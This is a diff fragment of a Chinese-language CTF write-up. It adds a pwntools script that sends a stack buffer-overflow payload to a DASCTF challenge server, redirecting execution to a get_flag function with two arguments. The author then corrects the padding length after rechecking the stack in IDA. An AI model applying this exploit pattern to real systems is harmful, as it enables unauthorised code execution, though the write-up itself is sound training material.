@@ -44,7 +44,31 @@ a2=0x195719D1
 >
 > <img width="1197" height="717" alt="屏幕截图 2026-06-10 203018" src="https://github.com/user-attachments/assets/d307c36c-71ea-4e67-9c2c-0f3c4b811e45" />
 
+好了构造payload
 
+```
+from pwn import *
+context.log_level = 'debug'
+r=remote("fc14659447ec8bb76ba314c5.tcp-ctf2.dasctf.com", 9999, ssl=True)
 
+get_flag=0x080489A0
+a1=0x308CD64F
+a2=0x195719D1
+exit=0x0804E6A0
+
+payload=b"a"*60+p32(get_flag)+p32(exit)+p32(a1)+p32(a2)
+r.sendline(payload)
+
+r.interactive()
+```
+但我试了好多次都不行看了看别人的做题理解，发现 b"a" 好像只需 ×56，于是再返回 IDA 看看
+
+<img width="725" height="64" alt="image" src="https://github.com/user-attachments/assets/79e04528-86e2-4dda-8ea1-9574d6e32af0" />
+
+发现重点
 
 char 变量名[大小]; // [相对于esp的位置] [相对于ebp的位置或栈帧边界]
+
+获得flag
+
+<img width="1511" height="143" alt="image" src="https://github.com/user-attachments/assets/974b75db-5c51-413a-bc75-9e1496b6c896" />
